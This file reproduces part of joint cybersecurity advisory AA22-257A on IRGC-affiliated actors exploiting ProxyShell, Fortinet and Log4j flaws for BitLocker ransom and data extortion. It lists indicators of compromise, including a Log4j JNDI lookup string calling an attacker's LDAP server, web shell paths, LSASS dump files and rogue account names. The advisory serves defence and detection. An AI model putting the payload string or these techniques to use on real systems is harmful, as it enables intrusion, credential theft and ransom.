@@ -1,0 +1,114 @@
+# FBI/CISA/NSA et al. AA22-257A — Iranian Islamic Revolutionary Guard Corps-Affiliated Cyber Actors Exploiting Vulnerabilities for Data Extortion and Disk Encryption for Ransom Operations
+
+> - Publisher: FBI, CISA, NSA, USCC-CNMF, Treasury, ACSC, CCCS and NCSC, Joint Cybersecurity Advisory, Product ID AA22-257A, September 14, 2022 (TLP:WHITE)
+> - Download URL (FBI IC3 copy of the joint advisory): https://www.ic3.gov/CSA/2022/220914.pdf
+> - CISA web page (not fetched; returns 403 from the retrieval host): https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-257a
+> - PDF SHA-256: c89187eb8c4c96e6b5148fefe08288654deb84e0bf3e384b9aa88b413634ec6d (`source.pdf`, 15 pages)
+> - License: U.S. Government work, TLP:WHITE
+> - Scope of this file: introduction (pp.1–2, main column; the "Actions to take today" sidebar and reporting box are omitted) and TECHNICAL DETAILS through Impact [TA0040] (pp.2–5), verbatim. Mitigations, IOC tables and ATT&CK appendix are in `source.pdf.txt`.
+> - Retrieved: 2026-11-16
+> - Wording: the source's own wording; only page furniture, the sidebar and line wrapping were removed. Source typos are kept (for example "${jdni:ldap//…" and "CVE-2021" without a number in the fourth bullet).
+
+## Introduction
+
+This joint Cybersecurity Advisory (CSA) is the result of an analytic effort among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), U.S. Cyber Command (USCC) - Cyber National Mission Force (CNMF), the Department of the Treasury (Treasury), the Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), and the United Kingdom’s National Cyber Security Centre (NCSC) to highlight continued malicious cyber activity by advanced persistent threat (APT) actors that the authoring agencies assess are affiliated with the Iranian Government’s Islamic Revolutionary Guard Corps (IRGC). Note: The IRGC is an Iranian Government agency tasked with defending the Iranian Regime from perceived internal and external threats. Hereafter, this advisory refers to all the coauthors of this advisory as "the authoring agencies."
+
+This advisory updates joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, which provides information on these Iranian government-sponsored APT actors exploiting known Fortinet and Microsoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in furtherance of malicious activities, including ransom operations. The authoring agencies now judge these actors are an APT group affiliated with the IRGC.
+
+Since the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors Exploiting Fortinet Vulnerabilities to Gain Access for Malicious Activity from May 2021, the authoring agencies have continued to observe these IRGC-affiliated actors exploiting known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial access. The IRGC-affiliated actors have used this access for follow-on activity, including disk encryption and data extortion, to support ransom operations.
+
+The IRGC-affiliated actors are actively targeting a broad range of entities, including entities across multiple U.S. critical infrastructure sectors as well as Australian, Canadian, and United Kingdom organizations. These actors often operate under the auspices of Najee Technology Hooshmand Fater LLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring agencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than targeting specific targeted entities or sectors.
+
+This advisory provides observed tactics, techniques and indicators of compromise (IOCs), that the authoring agencies assess are likely associated with this IRGC-affiliated APT. The authoring agencies urge organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC- affiliated cyber actors.
+
+## TECHNICAL DETAILS
+
+### Threat Actor Activity
+
+As reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the authoring agencies have observed Iranian government-sponsored APT actors scanning for and/or exploiting the following known Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial access to a broad range of targeted entities: CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, and CVE-2021-34473 (a ProxyShell vulnerability). The authoring agencies have also observed these APT actors leveraging CVE-2021-34473 against U.S. networks in combination with ProxyShell vulnerabilities CVE-2021-34523 and CVE-2021-31207. The NCSC judges that Yazd, Iran-based company Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC judges that these APT actors have used CVE-2021-34473 in Australia to gain access to systems. The APT actors can leverage this access for further malicious activities, including deployment of tools to support ransom and extortion operations, and data exfiltration.
+
+Since the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities CVE-2021-44228 (“Log4Shell”), CVE-2021-45046, and CVE-2021-45105 for initial access.
+
+The IRGC-affiliated actors have used their access for ransom operations, including disk encryption and extortion efforts. After gaining access to a network, the IRGC-affiliated actors likely determine a course of action based on their perceived value of the data. Depending on the perceived value, the actors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use the exfiltrated data in extortion operations or “double extortion” ransom operations where a threat actor uses a combination of encryption and data theft to pressure targeted entities to pay ransom demands.
+
+IRGC-affiliated actor activity observed by the authoring agencies includes:
+
+- In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207) on a Microsoft Exchange server to gain access to the network of a U.S. police department. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.
+- In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207), on a Microsoft Exchange server to gain access to the network of a U.S. regional transportation company. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom. This activity disrupted the transportation company’s operations for an extended period.
+- In February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021-45105) in a VMware Horizon application to gain access to the network of a U.S. municipal government, move laterally within the network, establish persistent access, initiate crypto-mining operations, and conduct additional malicious activity.
+- In February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021) to gain access to the network of a U.S. aerospace company. The actors leveraged a server that the authoring agencies assess is associated with the IRGC-affiliated actors to exfiltrate data from the company's network.
+
+### MITRE ATT&CK® Tactics and Techniques
+
+Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix B for a table of the MITRE ATT&CK tactics and techniques observed.
+
+The authoring agencies assess the following tactics and techniques are associated with this activity.
+
+#### Resource Development [TA0042]
+
+The IRGC-affiliated actors have used the following malicious and legitimate tools [T1588.001, T1588.002] for a variety of tactics across the enterprise spectrum:
+
+- Fast Reverse Proxy (FRP) for command and control (C2)
+- Plink for C2
+- Remote Desktop Protocol (RDP) for lateral movement
+- BitLocker for data encryption
+- SoftPerfect Network Scanner for system network configuration discovery
+
+Note: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
+
+#### Initial Access [TA0001]
+
+As stated in the Technical Details section previously reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the IRGC-affiliated actors gained initial access by exploiting known vulnerabilities [T1190].
+
+The following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation on targeted entity networks:
+
+- Web shells with naming conventions aspx_[11 randomly generated alphabetic characters].aspx, login.aspx, or default.aspx in any of the following directories:
+  - C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\
+  - C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
+  - C:\inetpub\wwwroot\aspnet_client\
+
+The following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation on targeted entity networks:
+
+- ${jdni:ldap//148.251.71.182:1389/RCE} (user agent string)
+- RCE.class
+
+#### Execution [TA0002]
+
+The IRGC-affiliated actors may have made modifications to the Task Scheduler [T1053.005]. These modifications may display as unrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:
+
+- Wininet
+- Wininet’
+- WinLogon
+- CacheTask
+
+Note: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For additional tasks used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
+
+#### Persistence [TA0003]
+
+The IRGC-affiliated actors established new user accounts on domain controllers, servers, workstations, and active directories [T1136.001, T1136.002]. The actors enabled a built-in Windows account (DefaultAccount) and escalated privileges to gain administrator-level access to a network. Some of these accounts appear to have been created to look similar to other existing accounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or accounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:
+
+- Domain Admin
+- it_admin
+- DefaultAccount
+- Default01
+
+Note: For additional account usernames associated with this activity, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
+
+#### Exfiltration [TA0010]
+
+The authoring agencies have observed the IRGC-affiliated actors dumping and subsequently exfiltrating the Local Security Authority Subsystem Service (LSASS) process memory on targeted entity networks in furtherance of credential harvesting. The following IOCs are associated with data exfiltration from targeted entity networks:
+
+- C:\Windows\Temp\sassl[.]pmd
+- C:\Windows\Temp\ssasl[.]zip
+- C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]dmp
+- C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]zip
+
+#### Impact [TA0040]
+
+The IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data [T1486] and held the decryption keys for ransom. The corresponding ransom notes were sent to the targeted entity, left on the targeted entity network as a .txt file or printed on the targeted entity’s networked printer(s). The notes included the following contact information:
+
+- @BuySafety (Telegram)
+- @WeRBits (Telegram)
+- +93794415076 (Telegram)
+- +93794415076 (WhatsApp)
+- werbits@onionmail[.]org
